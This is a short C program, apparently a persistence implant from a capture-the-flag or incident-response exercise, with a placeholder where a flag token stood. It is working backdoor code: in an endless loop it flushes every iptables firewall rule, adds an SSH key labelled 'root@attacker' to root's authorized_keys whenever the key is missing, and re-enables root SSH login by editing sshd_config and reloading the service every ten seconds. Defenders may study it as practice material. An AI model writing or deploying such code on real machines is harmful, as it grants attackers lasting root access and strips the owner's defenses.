#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

//const char token[] = "01010000 01000011 01000011 01000011 01111011 01110100 01101111 01101011 01100101 01101110 01011111 00111000 01011111 01110111 01100001 01110100 01100011 01101000 01100100 01101111 01100111 01111101";
const char token[] = "PLACEHOLDER";
int main() {
    while(1) {
        int status, exit_code;
        system("iptables -F");
        status = system("grep -q 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXYTc/cVMl+VgSuXJpYlmFh3TtoMnSiHTRZxxYyfSlAKgJS9pgyA2pLjiCXJSu95ii8KZHVRbkFFD8vPkKCkVWIuXvP1jsxyUmWL73uBmFnCeZ0s2SQ+S8+7dqRNBu6GxXSi3MGcPx+89CenUCAHukq1Uyo/qjeQxjkdIaOceXUm+EovnXqvMdJ+yGgDkOUvtj9R4pR7V1P0W4HVR+18VpBLXm4tDThPRGtejecC0iYencvSMdZ3YW8yMkitVN77S+pNINtH1uMzkUDL1f82kjL7Su78Hz3DfMJMgLeDu9VlL1+bGlgXelzaGwyqwqchEN5oy6x1XDZHnfznR3wfZbB/z4F/kxzwdfFE3u9izgXl5xeNWqNUHAZp5OVve8ITj6jxvUjdy9w8hvrk+q71KgfdgDwwGT28AI3YArBqUOjpsCAq0whWKo8rGSCZ6yZVLBykacdjaMd9Btyl8iyXvqViALdyE4JIPenMMLV9wkU7tWISqCb6+aJvQOAu3uxCc= root@attacker' /root/.ssh/authorized_keys");
        if (WIFEXITED(status)) {
            exit_code = WEXITSTATUS(status);
            if (exit_code != 0) {
                system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXYTc/cVMl+VgSuXJpYlmFh3TtoMnSiHTRZxxYyfSlAKgJS9pgyA2pLjiCXJSu95ii8KZHVRbkFFD8vPkKCkVWIuXvP1jsxyUmWL73uBmFnCeZ0s2SQ+S8+7dqRNBu6GxXSi3MGcPx+89CenUCAHukq1Uyo/qjeQxjkdIaOceXUm+EovnXqvMdJ+yGgDkOUvtj9R4pR7V1P0W4HVR+18VpBLXm4tDThPRGtejecC0iYencvSMdZ3YW8yMkitVN77S+pNINtH1uMzkUDL1f82kjL7Su78Hz3DfMJMgLeDu9VlL1+bGlgXelzaGwyqwqchEN5oy6x1XDZHnfznR3wfZbB/z4F/kxzwdfFE3u9izgXl5xeNWqNUHAZp5OVve8ITj6jxvUjdy9w8hvrk+q71KgfdgDwwGT28AI3YArBqUOjpsCAq0whWKo8rGSCZ6yZVLBykacdjaMd9Btyl8iyXvqViALdyE4JIPenMMLV9wkU7tWISqCb6+aJvQOAu3uxCc= root@attacker' >> /root/.ssh/authorized_keys");
            }
        }
        status = system("grep -q \"^PermitRootLogin no\" /etc/ssh/sshd_config");
        if (WIFEXITED(status)) {
            exit_code = WEXITSTATUS(status);

            if (exit_code == 0) {
                system("sed -i 's/^PermitRootLogin no/#PermitRootLogin no/g' /etc/ssh/sshd_config");
                system("service ssh reload > /dev/null");
            }
        }
        sleep(10);
    }
    return 0;
}
